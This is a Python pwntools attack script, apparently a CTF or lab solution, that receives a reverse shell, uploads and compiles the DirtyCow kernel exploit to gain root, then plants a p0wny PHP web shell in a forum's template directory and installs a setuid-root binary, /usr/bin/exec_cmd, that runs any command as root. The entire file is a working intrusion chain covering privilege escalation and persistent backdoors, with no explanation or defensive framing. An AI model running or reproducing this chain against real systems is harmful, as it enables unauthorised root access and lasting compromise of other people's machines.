#! /usr/bin/env python3
from pwn import *
import time
import subprocess

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/../reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()

# Send dirty cow exploit code
with open(os.path.dirname(os.path.abspath(__file__))+'/../dirty.c', 'r') as file:
    content = file.read()
    file.close()
    l.sendline("cat > dirty.c << EOF")
    l.sendline(content)
    l.sendline("EOF")
    file.close()

# Compile and run the dirty cow exploit
l.sendline("gcc dirty.c -o dirty -pthread -lcrypt && ./dirty easywin")
p = log.progress('Waiting 30 seconds for DirtyCow ...')
time.sleep(30)
p.success('DirtyCow OK')
l.close()

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/../reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()
# Connect as root
l.sendline("su root")
time.sleep(2)
l.sendline("easywin")
time.sleep(2)

# Upload the p0wny-shell page
with open(os.path.dirname(os.path.abspath(__file__))+'/p0wny-shell.php', 'r') as file:
    content = file.read()
    l.sendline("cat > /var/www/forum/templates_c/shell.php << EOF")
    l.sendline(content.replace('`', '\`').replace('$', '\$'))
    l.sendline("EOF")
    file.close()

# Upload the exec_cmd binary
exec_cmd = """
#include <stdio.h>

int main(int ac, char **av){
    setuid(0);
    setgid(0);
    system(av[1]);
    return 0;
}
"""
l.sendline("cat > /usr/bin/exec_cmd.c << EOF")
l.sendline(exec_cmd)
l.sendline("EOF")
# Compile the exec_cmd
l.sendline("gcc /usr/bin/exec_cmd.c -o /usr/bin/exec_cmd")
l.sendline("chown root:root /usr/bin/exec_cmd && chmod 7777 /usr/bin/exec_cmd")
l.clean()

log.info("GOOD! Go to /var/www/forum/templates_c/shell.php")

l.sendline("whoami")
l.interactive()
